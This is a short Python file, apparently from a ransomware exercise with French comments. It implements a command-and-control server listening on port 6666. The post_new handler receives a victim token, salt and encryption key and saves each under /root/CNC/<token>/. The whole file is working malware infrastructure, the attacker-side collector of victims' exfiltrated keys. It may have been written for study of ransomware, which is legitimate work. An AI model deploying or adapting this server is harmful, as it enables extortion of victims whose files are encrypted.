import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        token = body.get("token") #Si token existe dans body, récupère sa valeur
        salt = body.get("salt")   #""
        key = body.get("key")     #""

        self.save_b64(token, salt, "salt.bin") #met le fichier salt.bin contenant la valeur de salt dans le repertoire token
        self.save_b64(token, key, "key.bin")   #""
        return {"status": "OK"} #retour d'un dict avec la valeur OK 

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()